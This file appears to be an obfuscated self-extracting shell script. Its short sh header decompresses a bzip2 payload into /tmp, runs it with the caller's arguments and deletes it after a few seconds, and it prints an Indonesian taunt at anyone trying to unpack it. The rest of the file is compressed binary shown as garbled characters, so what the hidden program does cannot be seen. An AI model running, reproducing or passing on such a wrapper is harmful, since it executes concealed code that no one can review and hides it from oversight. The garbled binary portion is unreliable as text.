#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY��Y  C߀ }���aA
���@��� �& �$������� �   �4@4Қ��C �@�4� 4�4����bF����:*/��K�XWY�"�F�fSvL-�C���O�3^d���W٪z8%3�����qU�F��s5����L�hB�G��3�W�n'Lnx&�$/��� )C�D�!P-�F�R��h8�gz��A�0 }�dy ⑘Vr���s1���Ll�e6�h�(q�"W�T%�q���8Ĳ<�=�I����h�x��O�U���S�q�v
)����$��BJ���� �@Č)�<r�y
*Z�4�dYHr0>��!VjD��9�`��6��lm�]%��M�-=�5��Y-��aέ0z`M~ ��b�w���\�*\�,R�9�0|�qN}v�C�N-4�@���0�N>OG����iYQ�S.(ݩ�ϞmR��@�N0�*$,"UB��w$S�	
Ց�